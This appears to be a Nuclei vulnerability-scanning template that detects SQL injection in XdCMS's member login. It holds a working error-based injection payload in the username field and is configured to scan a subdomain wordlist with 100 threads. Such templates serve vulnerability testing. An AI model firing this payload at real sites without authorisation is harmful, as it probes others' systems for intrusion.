id: xdcms-sqli
info:
  name: XdCMS SQL Injection
  author: pikpikcu
  severity: high
  reference: https://www.uedbox.com/post/35188/
  tags: sqli,xdcms
requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100
    raw:
      - |
        GET /index.php?m=member&f=login_save HTTP/1.1
        Host: {{Subdomains}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*

        username=dd' or extractvalue(0x0a,concat(0x0a,810663301*872821376))#&password=dd&submit=+%B5%C7+%C2%BC+
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Content-Type: text/html"
        part: header
      - type: word
        words:
          - "707564257851522176"
          - "XPATH syntax error:"
        part: body
        condition: and
      - type: status
        status:
          - 200
